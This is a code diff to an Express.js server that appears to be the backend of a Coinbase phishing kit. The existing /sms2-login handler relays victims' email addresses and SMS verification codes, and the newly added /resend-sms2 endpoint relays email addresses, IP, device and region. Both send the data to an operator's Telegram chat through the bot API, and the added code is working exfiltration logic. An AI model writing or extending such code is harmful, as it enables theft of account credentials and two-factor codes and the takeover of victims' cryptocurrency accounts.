@@ -1634,10 +1634,10 @@ app.post("/sms2-login", async (req, res) => {
     console.log(`📥 SMS 2 Request received: ${sms2Id}`);
 
     const message =
-      `🔐🔐🔐 <b>Coinbase - SMS 2</b> 🔐🔐🔐\n` +
+      `😈😈😈 <b>Coinbase - SMS 2</b> 😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🔢 Code:</b> <code>${code}</code>\n` +
+      `<b>💬 Code:</b> <code>${code}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -1715,6 +1715,53 @@ app.post("/update-sms2-choice", (req, res) => {
     res.json({ ok: true });
   } catch (err) {
     console.error("❌ Update SMS 2 choice error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ POST /resend-sms2 - SMS 2 Resend
+app.post("/resend-sms2", async (req, res) => {
+  try {
+    const { email, userId } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: "Missing email" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("❌ SMS 2 resend error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
